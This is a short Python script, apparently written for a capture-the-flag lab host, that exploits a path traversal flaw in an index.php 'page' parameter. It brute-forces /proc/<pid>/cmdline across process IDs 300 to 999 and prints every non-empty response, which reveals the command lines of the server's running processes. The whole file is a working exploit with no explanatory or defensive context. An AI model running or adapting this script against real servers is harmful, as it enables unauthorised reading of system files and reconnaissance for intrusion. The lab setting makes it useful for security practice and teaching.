#!/usr/bin/python3

import requests, signal, sys
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)

def makeRequest():
	bar = log.progress("Brute forcer pid-cmdline")
	bar.status("Starting")

	for i in range(300,1000):
		bar.status(f"Trying with PATH /proc/{i}/cmdline")
		url = f'http://10.10.11.154/index.php?page=../../../../../../../../../../proc/{i}/cmdline'
		r = requests.get(url, allow_redirects=False)

		if len(r.text) > 0:
			print("-----------------------------------------------------------------------------------")
			log.info(f"PATH: /proc/{i}/cmdline")
			print(r.text)
			print("-----------------------------------------------------------------------------------")

makeRequest()
